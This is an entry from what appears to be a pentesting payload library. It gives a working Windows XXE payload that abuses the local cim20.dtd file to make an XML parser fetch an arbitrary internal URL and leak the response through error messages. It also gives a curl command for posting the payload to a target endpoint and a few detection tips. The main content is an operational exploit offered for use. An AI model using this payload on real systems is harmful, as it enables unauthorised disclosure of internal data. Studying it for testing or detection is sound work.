---
id: c538a66a-a7c9-404a-a6a9-d3c28fda0391
name: Windows-XXE-Payload-Using-Local-DTD-for-HTTP-Fetch
type: code
language: xml
verified: true
created_at: '2023-04-06T03:56:44.728426+00:00'
updated_at: '2023-04-10T20:24:42.681333+00:00'
platforms:
  - Windows
  - Web
tags:
  - xxe
  - payload
  - dtd
  - http-disclosure
validated: true
---

# Windows-XXE-Payload-Using-Local-DTD-for-HTTP-Fetch

## Code

```xml
<!DOCTYPE doc [
    <!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\wbem\xml\cim20.dtd">
    <!ENTITY % SuperClass '>
        <!ENTITY % file SYSTEM "$_TARGET_URL">
        <!ENTITY % eval "<!ENTITY % error SYSTEM 'file://test/#%file;'>">
        %eval;
        %error;
      <!ENTITY test "test"'
    >
    %local_dtd;
  ]><xxx>cacat</xxx>
```

## Description

This XML payload exploits XXE vulnerabilities on Windows targets by loading a local DTD (cim20.dtd) to define a complex entity structure. It creates a side-channel to fetch HTTP content from a specified URL and leaks it through an error entity, allowing disclosure of internal responses without direct file reads.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $_TARGET_URL | The HTTP URL to fetch and disclose (e.g., internal API endpoint) | https://erp.company.com/api/sensitive |

## Usage

Save the payload to a file (e.g., xxe-payload.xml) and POST it to a vulnerable XML endpoint using tools like curl: `curl -X POST -d @xxe-payload.xml http://target.com/xml-endpoint`. Substitute $_TARGET_URL before sending. This is typically used in web pentesting to exfiltrate backend HTTP data via parser resolution.

## Detection

- Monitor XML inputs for DOCTYPE declarations referencing local files (e.g., cim20.dtd) or external SYSTEM entities.
- Log parser errors containing unexpected HTTP content or entity expansions.
- WAF rules for XXE signatures, such as '% SuperClass' patterns or DTD inclusions.
- Network logs showing fetches to internal URLs triggered by XML processing.

## Related

- [[procedures/XXE-Injection-to-Disclose-HTTP-Response]]
